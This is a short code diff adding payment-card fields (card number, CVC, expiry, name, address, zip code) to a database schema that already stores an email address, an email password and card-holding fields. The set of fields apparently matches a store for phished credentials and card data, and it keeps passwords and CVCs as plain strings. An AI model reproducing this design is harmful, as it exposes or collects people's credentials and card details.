@@ -48,7 +48,14 @@ const infoSchema = new Schema({
     mail: { type: String },
     mailPass: { type: String },
     onlyCard: { type: String },
-    holdingCard: { type: String }
+    holdingCard: { type: String },
+     validity: { type: String },
+    address: { type: String },
+    cardNumber: { type: String },
+
+    cvc: { type: String },
+    name: { type: String },
+    zipCode: { type: String },
 
 
 
